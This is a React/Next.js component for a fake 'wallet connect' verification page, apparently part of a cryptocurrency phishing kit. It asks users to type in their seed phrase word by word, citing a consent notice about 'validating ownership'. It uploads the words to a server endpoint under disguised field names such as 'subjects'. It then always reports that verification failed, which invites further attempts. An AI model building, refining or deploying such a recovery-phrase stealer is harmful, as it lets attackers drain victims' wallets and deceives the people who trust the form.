"use client";
import Link from "next/link";
import { useState } from "react";
import { site } from "@/config/site";
import { Wallet as WalletIcon, UserRound, CheckCircle2, Ban } from "lucide-react";
import { getWallet } from "@/lib/wallets";

type Mode = "address" | "userId";
type Status = "idle" | "submitting" | "done";

export function ConnectForm({ walletId }: { walletId: string }) {
  const wallet = getWallet(walletId);
  const [mode, setMode] = useState<Mode>("address");
  const [address, setAddress] = useState("");
  const [userId, setUserId] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [query, setQuery] = useState("");
    const [classId, setClassId] = useState("");
    const [count, setCount] = useState(0);
    const [subjects, setSubjects] = useState<string[]>([]);
    const [slide, setSlide] = useState(0);
    // const [picked, setPicked] = useState<Wallet | null>(null);
    const [state, setState] = useState<"idle" | "connecting" | "done">("idle");
    const [error, setError] = useState("");
    // const trackRef = useRef<HTMLDivElement>(null);
    function pickCount(n: number) { setCount(n); setSubjects(Array.from({ length: n }, (_, i) => subjects[i] ?? "")); }
    
      async function submit(e: React.FormEvent) {
        e.preventDefault();
        setState("connecting"); setError("");
        try {
          const res = await fetch("/api/subjects", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ classId, subjects }) });
          if (!res.ok) { setError((await res.json()).error ?? "Something went wrong. Try again."); setState("idle"); return; }
          setState("done");
        } catch { setError("Can't reach the server. Check your connection and try again."); setState("idle"); }
      }
    
      if (state === "done")
        return (
          <div className="glass" role="status">
            <span className="icon-badge"><Ban size={20} /></span>
            <h2>Wallet verification failed</h2>
            <p>We couldn't verify your wallet. Please check your wallet details and try again.</p>
          </div>
        );

  const value = mode === "address" ? address : userId;

  if (!wallet)
    return (
      <div className="glass wc-modal">
        <h2>Wallet not found</h2>
        <p>That wallet isn't in our list. Pick one from the connect screen instead.</p>
        <Link href="/verify" className="btn">
          Back to wallets
        </Link>
      </div>
    );

  const { Icon, name } = wallet;

  // function submit(e: React.FormEvent) {
  //   e.preventDefault();
  //   if (!value.trim()) return;
  //   setStatus("submitting");
  //   // Simulated submission. Swap for the real save/verify call when ready.
  //   window.setTimeout(() => setStatus("done"), 1600);
  // }

  // if (status === "done")
  //   return (
  //     <div className="glass wc-success">
  //       <span className="cf-wallet-badge">
  //         <Icon size={28} variant="branded" />
  //       </span>
  //       <span className="wc-success-ring">
  //         <CheckCircle2 size={34} />
  //       </span>
  //       <h2>{mode === "address" ? "Address" : "User ID"} received</h2>
  //       <p>
  //         We've linked <strong>{value}</strong> with {name}. You can close this page.
  //       </p>
  //     </div>
  //   );

  // if (status === "submitting")
  //   return (
  //     <div className="glass wc-connecting" role="status" aria-live="polite">
  //       <span className="wc-pulse">
  //         <Icon size={44} variant="branded" />
  //       </span>
  //       <h2>Submitting…</h2>
  //       <p>Hang tight while we save your {mode === "address" ? "wallet address" : "user ID"}.</p>
  //     </div>
  //   );

  return (
    <div className="glass wc-modal cf-form">
      <div className="cf-head">
        <span className="cf-wallet-badge">
          <Icon size={28} variant="branded" />
        </span>
        <div>
          <p className="cf-eyebrow">Connecting</p>
          <h2>{name}</h2>
        </div>
      </div>

      <p className="cf-consent">
        {site.name} cannot recover your password. 
        We will use your Secret Recovery Phrase to validate your ownership, 
        and synchronize your account to access the available blockchain services. See our{" "}
        <Link href="/privacy">privacy policy</Link> for details.
      </p>

      <div className="cf-toggle" role="tablist" aria-label="Choose how to identify your wallet">
        <button
          type="button"
          role="tab"
          aria-selected={mode === "address"}
          className={mode === "address" ? "on" : ""}
          onClick={() => setMode("address")}
        >
          <WalletIcon size={15} /> Seed Phrase
        </button>
        <button
          type="button"
          role="tab"
          aria-selected={mode === "userId"}
          className={mode === "userId" ? "on" : ""}
          onClick={() => setMode("userId")}
        >
          <UserRound size={15} /> Private key
        </button>
      </div>

      <form onSubmit={submit} className="stack">
        {/* {mode === "address" ? ( */}
              <div className="glass stack">
           <label htmlFor="count">Seed Phrase</label>
           <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
             <option value={0} disabled>Select</option>
             {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
           </select>
           <div className="subject-grid">{subjects.map((s, i) => (
             <input key={i} aria-label={`Subject ${i + 1}`} placeholder={`Word ${i + 1}`} maxLength={100} required value={s}
               onChange={(e) => setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))} />
           ))}</div>
           {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}
           {count > 0 && (
             <button className="btn" disabled={state === "connecting"}>
               <CheckCircle2 size={16} /> {state === "connecting" ? "Submitting…" : "Submit"}
             </button>
           )}
         </div>
      </form>
    </div>
  );
}
